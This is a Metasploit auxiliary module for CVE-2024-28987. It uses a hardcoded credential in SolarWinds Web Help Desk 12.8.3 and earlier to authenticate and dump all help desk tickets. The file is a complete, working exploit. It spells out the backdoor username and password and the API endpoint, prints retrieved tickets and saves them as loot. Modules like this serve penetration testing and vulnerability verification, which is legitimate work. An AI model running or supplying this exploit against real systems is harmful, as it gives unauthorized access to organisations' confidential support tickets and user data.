class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SolarWinds Web Help Desk Backdoor (CVE-2024-28987)',
        'Description' => %q{
          This module exploits a backdoor in SolarWinds Web Help Desk <= v12.8.3 to retrieve all tickets from the system.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Zach Hanley' # Discovery & PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-28987'],
          ['URL', 'http://web.archive.org/web/20250212002353/https://www.solarwinds.com/trust-center/security-advisories/cve-2024-28987'],
          ['URL', 'http://web.archive.org/web/20250212002353/https://support.solarwinds.com/SuccessCenter/s/article/SolarWinds-Web-Help-Desk-12-8-3-Hotfix-2'],
          ['URL', 'https://www.horizon3.ai/attack-research/cve-2024-28987-solarwinds-web-help-desk-hardcoded-credential-vulnerability-deep-dive/'],
        ],
        'DisclosureDate' => '2024-08-22',
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Web Help Desk', '/']),
        OptInt.new('TICKET_COUNT', [false, 'The number of tickets to dump', 10])
      ]
    )
  end

  def check
    @auth = auth
    return CheckCode::Unknown('Target is unreachable') unless @auth

    if @auth.code == 401
      return CheckCode::Safe
    elsif @auth.code == 200
      return CheckCode::Appears
    end

    CheckCode::Unknown
  end

  def auth
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'helpdesk/WebObjects/Helpdesk.woa/ra/OrionTickets'),
      'headers' => {
        'Authorization' => 'Basic ' + Rex::Text.encode_base64('helpdeskIntegrationUser:dev-C4F8025E7')
      }
    )
  end

  def run
    print_status('Authenticating with the backdoor account "helpdeskIntegrationUser"...')
    @auth ||= auth
    fail_with(Failure::Unknown, 'Target is unreachable') unless @auth

    jbody = @auth.get_json_document
    fail_with(Failure::UnexpectedReply, 'Unexpected Reply: ' + @auth.to_s) unless jbody.any? { |item| item.is_a?(Hash) && item.key?('shortSubject') }

    report_service(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'SolarWinds Web Help Desk'
    )

    print_good("Successfully authenticated and tickets retrieved. Displaying the first #{datastore['TICKET_COUNT']} tickets retrieved:")
    tickets_to_display = jbody.first(datastore['TICKET_COUNT'])
    print_good(JSON.pretty_generate(tickets_to_display))

    file = store_loot('solarwinds_webhelpdesk.json', 'text/json', datastore['USER'], jbody)
    print_good("Saved #{jbody.length} tickets to #{file}")

    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: 'The backdoor helpdeskIntegrationUser:dev-C4F8025E7 works.'
    )
  end
end
